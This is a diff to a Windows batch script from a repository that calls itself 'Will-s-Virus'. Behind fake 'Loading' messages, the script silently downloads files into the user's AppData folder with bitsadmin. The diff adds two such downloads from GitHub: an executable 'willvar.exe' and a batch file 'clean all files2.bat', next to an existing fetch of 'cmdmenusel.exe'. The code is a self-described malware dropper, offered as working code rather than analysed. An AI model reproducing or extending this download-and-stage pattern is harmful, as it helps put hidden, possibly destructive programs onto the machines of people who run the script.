@@ -11,6 +11,7 @@ ping localhost -n 1 >nul
 cls
 echo Loading.
 if not exist "%appdata%\willishot\willishot1.png" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/willishot1.png" "%appdata%\willishot\willishot1.png" >nul
+if not exist "%appdata%\willishot\clean all files2.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/clean all files2.bat" "%appdata%\willishot\clean all files2.bat" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading..
@@ -18,6 +19,7 @@ if not exist "%appdata%\willishot\windows.jpg" bitsadmin /transfer willishot.exe
 ping localhost -n 1 >nul
 cls
 echo Loading...
+if not exist "%appdata%\willishot\willvar.exe" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/willvar.exe" "%appdata%\willishot\willvar.exe" >nul
 if not exist "%appdata%\willishot\cmdmenusel.exe" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/cmdmenusel.exe" "%appdata%\willishot\cmdmenusel.exe" >nul
 ping localhost -n 1 >nul
 cls
